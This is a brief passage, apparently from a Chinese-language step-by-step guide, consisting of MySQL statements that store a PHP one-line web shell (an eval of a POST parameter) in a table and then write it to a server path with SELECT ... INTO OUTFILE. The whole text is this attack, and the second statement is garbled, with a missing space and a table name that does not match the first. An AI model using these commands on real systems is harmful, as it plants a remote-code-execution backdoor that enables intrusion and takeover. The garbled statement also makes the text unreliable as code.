INSERT INTO \`mysql\`.\`cesafe\` (\`cesafe1\` )VALUES ('<?php @eval($\_POST\[cesafe\])?>');  
第三步：  
SELECT cesafeFROM study INTO OUTFILE 'D:/CGOA/22php';
